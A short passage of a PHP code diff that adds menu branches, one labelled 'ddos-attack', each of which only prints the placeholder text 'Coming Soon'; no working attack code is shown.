+		print "Coming Soon";
+	}
+	if($z=="ddos-attack")
+	{
+		print "Coming Soon";
 	}
 
 	echo "</div>";
